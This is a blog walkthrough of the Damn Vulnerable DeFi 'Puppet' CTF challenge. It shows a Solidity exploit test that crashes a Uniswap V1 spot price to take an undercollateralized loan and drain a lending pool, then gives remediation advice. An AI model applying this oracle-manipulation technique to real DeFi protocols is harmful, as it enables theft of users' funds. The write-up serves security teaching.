@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Vasiliy Yorkin">
+<meta name="description" content="Challenge There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+There&rsquo;s a DVT market opened in an description Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
+Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.">
+<meta name="keywords" content="Vasiliy Yorkin">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #8 Puppet"/>
+<meta name="twitter:description" content="Challenge There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+There&rsquo;s a DVT market opened in an description Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
+Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool."/>
+
+<meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #8 Puppet" />
+<meta property="og:description" content="Challenge There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+There&rsquo;s a DVT market opened in an description Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
+Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-8-puppet/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-15T12:30:00+03:00" />
+<meta property="article:modified_time" content="2022-11-15T12:30:00+03:00" />
+
+
+
+
+  <title>vyorkin.org</title>
+
+  
+  <link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-8-puppet/">
+  
+
+  <link rel="preload" href="https://vyorkin.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.bce1ad3fd9463aca56f0ae393ff86fb2a0d51b58b56e32625fa4af028409f02d.css" integrity="sha256-vOGtP9lGOspW8K45P/hvsqDVG1i1bjJiX6SvAoQJ8C0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.e2e6584ce20683687b57e321b1116fbb5051e3534cc7846c9baccff833431b67.css" integrity="sha256-4uZYTOIGg2h7V&#43;MhsRFvu1BR41NMx4Rsm6zP&#43;DNDG2c=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
+<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.104.3" />
+
+
+  
+
+</head>
+
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://vyorkin.org/">
+      vyorkin.org
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/about/">4b0u7</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/posts/">bl06</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/ru-ru/">ru</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/de-de/">de</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-8-puppet/">
+              CTF walkthrough, Damn Vulnerable DeFi, #8 Puppet
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-11-15T12:30:00&#43;03:00">
+                November 15, 2022
+              </time>
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="https://vyorkin.org/categories/blockchain/">blockchain</a>
+      <span class="separator">•</span>
+    <a href="https://vyorkin.org/categories/ctf/">ctf</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/blockchain/">blockchain</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ctf/">ctf</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/security/">security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h2 id="challenge">
+  Challenge
+  <a class="heading-link" href="#challenge">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<blockquote class="quote2 quote2-question"><p>There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens
+(DVTs), where you first need to deposit twice the borrow amount
+in ETH as collateral. The pool currently has 100000 DVTs in
+liquidity.</p>
+<p>There&rsquo;s a DVT market opened in an
+<a href="https://docs.uniswap.org/protocol/V1/introduction">description
+Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in
+liquidity.</p>
+<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal
+all tokens from the lending pool.</p>
+</blockquote>
+
+<h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The <code>Puppet.t.sol</code> test contract uses the
+<a href="https://book.getfoundry.sh/reference/forge-std/deployCode?highlight=deployCode#deploycode">deployCode</a>
+to deploy Uniswap V1 contracts by fetching the ABI and bytecode
+from the artifacts directory. We assume it is an original
+Uniswap V1 pool so we can read
+<a href="https://docs.uniswap.org/protocol/V1/introduction">the docs</a>
+to see how to interact with it.</p>
+<p>Let&rsquo;s review the <code>borrow</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> borrow(<span style="color:#fff;font-weight:bold">uint256</span> borrowAmount) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> nonReentrant {
+</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">uint256</span> depositRequired = calculateDepositRequired(borrowAmount);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &lt; depositRequired) <span style="color:#fff;font-weight:bold">revert</span> NotDepositingEnoughCollateral();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &gt; depositRequired) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> - depositRequired);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    deposits[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = deposits[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] + depositRequired;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Fails if the pool doesn&#39;t have enough tokens in liquidity
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (!token.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, borrowAmount)) <span style="color:#fff;font-weight:bold">revert</span> TransferFailed();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit Borrowed(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, depositRequired, borrowAmount);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The first line in the function body is the most interesting one.
+It calls the <code>calculateDepositRequired</code> to get the amount of ETH
+we need to deposit as a collateral to borrow the given <code>amount</code> of DVT&rsquo;s.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> calculateDepositRequired(<span style="color:#fff;font-weight:bold">uint256</span> amount)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">view</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (amount * _computeOraclePrice() * <span style="color:#ff0;font-weight:bold">2</span>) / <span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As we can see, user needs to deposit twice the borrow amount in
+ETH as collateral. This function calls the <code>_computeOraclePrice</code>
+to get the price of the token in <code>wei</code> according to Uniswap
+pair.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _computeOraclePrice() <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (uniswapPair.<span style="color:#fff;font-weight:bold">balance</span> * (<span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>)) / token.balanceOf(uniswapPair);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>_computeOraclePrice</code> acts as a price oracle. A terrible
+price oracle, because we can manipulate it by changing balances
+of the ETH/DVT Uniswap pool to take an undercollaterized loan.</p>
+<h2 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p><strong>Goal</strong>: We would like to borrow all the DVT&rsquo;s from the pool
+while providing as little ETH as possible.</p>
+<p>We have 1000 DVT&rsquo;s. So we can drop the price of DVT by selling
+all of them. This kind of huge trade would cause an imbalance in
+the ETH/DVT pool, which makes it possible to take out a loan that
+appears to be sufficiently collateralized, but is in fact
+undercollateralized. Then we can call the <code>borrow</code> function,
+which will use the ETH/DVT as oracle and check it at the instant
+when the apparent price has been manipulated:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
+</span></span><span style="display:flex;"><span>    dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Sell all the DVT&#39;s we have to drop its price
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">uint256</span> result = uniswapExchange.tokenToEthSwapInput(
+</span></span><span style="display:flex;"><span>        ATTACKER_INITIAL_TOKEN_BALANCE,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0;font-weight:bold">9</span> * <span style="color:#ff0;font-weight:bold">1</span>e18,
+</span></span><span style="display:flex;"><span>        DEADLINE
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    assertGt(result, <span style="color:#ff0;font-weight:bold">9</span> <span style="color:#fff;font-weight:bold">ether</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Get the undercollateralized loan
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    puppetPool.borrow{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#ff0;font-weight:bold">20</span> <span style="color:#fff;font-weight:bold">ether</span>}(<span style="color:#ff0;font-weight:bold">100</span>_000e18);
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    validation();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="summary-and-key-takeaways">
+  Summary and key takeaways
+  <a class="heading-link" href="#summary-and-key-takeaways">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>In general it is hard to use price oracles safely. And it&rsquo;s not
+always obvious that you&rsquo;re using a price oracle.</p>
+<h2 id="remediation">
+  Remediation
+  <a class="heading-link" href="#remediation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>There are a few solutions that you might want to
+consider to protect yourself.</p>
+<ul>
+<li>Don&rsquo;t use on chain AMM&rsquo;s as price oracles.</li>
+<li>Always consider the implications of dependencies on third-party projects.</li>
+<li>Do not dive in shallow markets. Markets without enough
+liquidity are dangerous and easier to manipulate.</li>
+<li>Time-Weighted Average Price (TWAP). Uniswap V2 introduced a
+<a href="https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles">TWAP
+oracle</a>, which is resistant to oracle manipulation attacks.</li>
+<li>M-of-N reporters: Use something like
+<a href="https://data.chain.link/">Chainlink price oracles</a>, which
+aggregates price data from Chainlink operators and exposes it
+on-chain.</li>
+<li>Speed bumps: Implement a delay of as short as 1 block between
+a user entering and exiting your system.</li>
+</ul>
+<h2 id="references">
+  References
+  <a class="heading-link" href="#references">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Check out these references if you want to learn more about
+dangers of price oracles:</p>
+<ul>
+<li><a href="https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/">Smart
+Contract Security Guidelines #3: The Dangers of Price
+Oracles</a> - Workshop by OpenZeppelin.</li>
+<li><a href="https://samczsun.com/so-you-want-to-use-a-price-oracle/">So
+you want to use a price oracle</a> - Everything you need to know
+about price oracles and how to use them safely. Blog post by <a href="https://samczsun.com/author/samczsun/">samczsun</a>.</li>
+<li><a href="https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/">Taking
+undercollateralized loans for fun and for profit</a> - Another
+cool blog post by
+<a href="https://samczsun.com/author/samczsun/">samczsun</a> from 2019.</li>
+<li><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/building-an-oracle">Building
+an Oracle</a> - Guide by Uniswap V2.</li>
+</ul>
+<hr>
+<p>I hope you enjoyed this writeup. The complete code is
+<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/puppet/Puppet.t.sol">here</a>.</p>
+<p>Let&rsquo;s move on! The next challenge is <a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-9-puppet-v2">#9
+Puppet V2</a>.</p>
+
+        
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      1985 -
+    
+    2022
+     Vasiliy Yorkin 
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
+  
+
+  
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-F8R77TYF8B', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
